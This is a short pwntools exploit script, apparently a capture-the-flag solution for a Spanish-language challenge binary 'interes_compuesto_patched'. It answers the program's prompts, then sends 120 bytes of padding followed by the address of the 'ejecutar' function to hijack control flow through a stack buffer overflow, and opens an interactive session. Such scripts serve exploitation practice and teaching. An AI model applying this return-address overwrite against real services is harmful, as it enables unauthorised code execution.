#!/usr/bin/env python3

from pwn import *

exe = ELF("./interes_compuesto_patched")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()

    offset = 120
    ejecutar = exe.symbols['ejecutar']
    info(hex(ejecutar))

    payload = b'A' * offset
    payload += p64(ejecutar)

    r.sendlineafter('inicial?', b'A')
    r.sendlineafter('retorno?', b'A')
    r.sendlineafter('invertido?', b'A')
    r.sendlineafter('nombre?', b'A')
    r.sendlineafter('edad?', payload)

    r.interactive()


if __name__ == "__main__":
    main()

